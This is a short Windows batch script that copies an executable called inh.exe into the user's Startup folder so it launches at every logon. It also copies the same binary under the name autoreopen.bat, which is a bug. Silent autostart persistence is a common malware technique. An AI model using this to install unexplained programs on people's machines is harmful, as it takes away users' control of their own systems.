@echo off
set "src=%~dp0inh.exe"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

copy "%src%" "%startup%\inh.exe" /Y
copy "%src%" "%startup%\autoreopen.bat" /Y


if %ERRORLEVEL%==0 (
    echo File copied successfully to Startup.
) else (
    echo Copy failed. Check permissions.
)
